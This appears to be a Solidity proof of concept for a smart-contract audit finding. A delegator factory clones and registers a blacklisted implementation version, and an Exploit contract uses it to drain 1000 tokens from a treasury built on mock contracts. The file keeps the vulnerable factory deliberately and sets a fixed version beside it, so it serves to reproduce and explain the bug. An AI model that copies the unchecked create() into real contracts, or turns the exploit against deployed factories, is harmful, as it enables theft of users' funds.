// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Suzaku Core — DelegatorFactory.create ignores a blacklisted version
    (Cyfrin / 0kage, finding #61232, 7 July 2025).

    SYNTHETIC, cheatcode-free. create() is the pre-fix body: it never reads
    blacklisted[type_]. A version the owner already blacklisted is still
    cloned, registered, and initialized. That entity is trusted by the
    treasury and pulls N = 1000 SZK out of it. The fixed factory reverts
    DelegatorFactory__VersionBlacklisted before the clone. */

interface IEntity {
    function initialize(bytes calldata data) external;
    function FACTORY() external view returns (address);
    function TYPE() external view returns (uint64);
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}

library MiniClones {
    function cloneDeterministic(address implementation, bytes32 salt) internal returns (address instance) {
        // @> VULN: create2 still deploys this version after it was blacklisted
        assembly ("memory-safe") {
            mstore(0x00, or(shr(0xe8, shl(0x60, implementation)), 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000))
            mstore(0x20, or(shl(0x78, implementation), 0x5af43d82803e903d91602b57fd5bf3))
            instance := create2(0, 0x09, 0x37, salt)
        }
        require(instance != address(0), "clone");
    }
}

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        name = name_;
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OwnableLite {
    address public owner;

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }
}

contract FactoryBase is OwnableLite {
    mapping(uint64 => bool) public blacklisted;
    address[] internal _implementations;
    address[] internal _entities;
    mapping(address => bool) public isEntityMap;

    constructor(address owner_) OwnableLite(owner_) {}

    function totalTypes() public view returns (uint64) {
        return uint64(_implementations.length);
    }

    function implementation(uint64 type_) public view returns (address) {
        return _implementations[type_];
    }

    function totalEntities() public view returns (uint256) {
        return _entities.length;
    }

    function isEntity(address entity_) public view returns (bool) {
        return isEntityMap[entity_];
    }

    function entityAt(uint256 index) external view returns (address) {
        return _entities[index];
    }

    function whitelist(address implementation_) external onlyOwner {
        if (!IEntity(implementation_).supportsInterface(type(IEntity).interfaceId)) revert BadImpl();
        if (IEntity(implementation_).FACTORY() != address(this) || IEntity(implementation_).TYPE() != totalTypes()) {
            revert BadImpl();
        }
        _implementations.push(implementation_);
    }

    function blacklist(uint64 type_) external onlyOwner {
        require(type_ < totalTypes(), "type");
        require(!blacklisted[type_], "already");
        blacklisted[type_] = true;
        require(blacklisted[type_], "not stored");
    }

    function _addDelegatorEntity(address entity_) internal {
        _entities.push(entity_);
        isEntityMap[entity_] = true;
        require(isEntityMap[entity_], "not registered");
    }

    error BadImpl();
}

contract Treasury {
    Token public token;
    FactoryBase public factory;

    constructor(Token token_, FactoryBase factory_) {
        token = token_;
        factory = factory_;
    }

    function release(address to, uint256 amount) external {
        require(factory.isEntity(msg.sender), "not entity");
        token.transfer(to, amount);
    }
}

contract VaultEntity is IEntity {
    address public immutable FACTORY;
    uint64 public immutable TYPE;

    constructor(address factory_, uint64 type_) {
        FACTORY = factory_;
        TYPE = type_;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IEntity).interfaceId;
    }

    function initialize(bytes calldata initData) external {
        require(msg.sender == FACTORY, "factory");
        (address treasury, address to, uint256 amount) = abi.decode(initData, (address, address, uint256));
        Treasury(treasury).release(to, amount);
    }
}

/// Pre-fix DelegatorFactory. create() does not consult blacklisted[type_].
contract DelegatorFactory is FactoryBase {
    using MiniClones for address;

    constructor(address owner_) FactoryBase(owner_) {}

    function create(uint64 type_, bytes calldata data) external returns (address entity_) {
        entity_ = implementation(type_).cloneDeterministic(keccak256(abi.encode(totalEntities(), type_, data)));
        _addDelegatorEntity(entity_);
        IEntity(entity_).initialize(data);
    }
}

/// Post-fix factory. A blacklisted version reverts before the clone.
contract DelegatorFactoryFixed is FactoryBase {
    using MiniClones for address;

    error DelegatorFactory__VersionBlacklisted();

    constructor(address owner_) FactoryBase(owner_) {}

    function create(uint64 type_, bytes calldata data) external returns (address entity_) {
        if (blacklisted[type_]) revert DelegatorFactory__VersionBlacklisted();
        entity_ = implementation(type_).cloneDeterministic(keccak256(abi.encode(totalEntities(), type_, data)));
        _addDelegatorEntity(entity_);
        IEntity(entity_).initialize(data);
    }
}

contract Exploit {
    uint256 public constant N = 1000 ether;

    Token public token;
    DelegatorFactory public factory;
    VaultEntity public impl;
    Treasury public treasury;
    address public entity;

    constructor() {
        token = new Token("Suzaku", "SZK", 18);
        factory = new DelegatorFactory(address(this));
        impl = new VaultEntity(address(factory), 0);
        treasury = new Treasury(token, factory);
    }

    function run() external {
        token.mint(address(treasury), N);
        factory.whitelist(address(impl));
        factory.blacklist(0);
        bytes memory data = abi.encode(address(treasury), address(this), N);
        entity = factory.create(0, data);
        require(factory.blacklisted(0), "version was blacklisted");
        require(factory.isEntity(entity), "blacklisted version became an entity");
        require(token.balanceOf(address(this)) == N, "entity did not move N");
        require(token.balanceOf(address(treasury)) == 0, "treasury still holds N");
    }
}
